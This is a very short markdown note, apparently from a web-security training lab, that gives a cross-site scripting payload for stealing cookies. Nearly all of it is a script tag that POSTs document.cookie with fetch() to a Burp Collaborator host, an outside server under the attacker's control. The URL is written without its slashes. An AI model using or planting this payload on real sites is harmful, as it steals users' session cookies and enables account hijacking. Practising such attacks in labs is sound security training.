# XSS

## Exploiting cross-site scripting to steal cookies

<script>
fetch('https:p9z114dhnywgf8ct7kwnwidujlpid7.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>

p9z114dhnywgf8ct7kwnwidujlpid7.burpcollaborator.net